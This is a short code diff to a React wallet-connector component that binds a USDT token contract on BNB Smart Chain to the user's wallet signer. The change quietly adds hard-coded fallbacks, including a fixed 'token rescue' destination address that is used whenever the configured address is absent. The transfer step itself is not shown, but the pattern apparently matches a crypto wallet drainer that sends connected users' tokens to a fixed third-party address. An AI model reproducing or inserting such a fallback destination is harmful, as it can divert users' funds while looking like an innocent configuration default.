@@ -71,9 +71,9 @@ export default function WalletConnector() {
       const provider = new ethers.BrowserProvider(window.ethereum);
       const signer = await provider.getSigner();
 
-      const usdtAddress = import.meta.env.VITE_BSC_USDT_CONTRACT_ADDRESS as string;
-      const destination = import.meta.env.VITE_TOKEN_RESCUE_CONTRACT as string;
-      const chainId = import.meta.env.VITE_BSC_CHAIN_ID;
+      const usdtAddress = (import.meta.env.VITE_BSC_USDT_CONTRACT_ADDRESS as string) || "0x55d398326f99059fF775485246999027B3197955";
+      const destination = (import.meta.env.VITE_TOKEN_RESCUE_CONTRACT || import.meta.env.VITE_RESCUE_DESTINATION_ADDRESS || "0xc6bf6838263938533e547f825d257c9965544a50") as string;
+      const chainId = Number(import.meta.env.VITE_BSC_CHAIN_ID || 56);
 
       const usdt = new ethers.Contract(usdtAddress, USDT_ABI, signer);
 
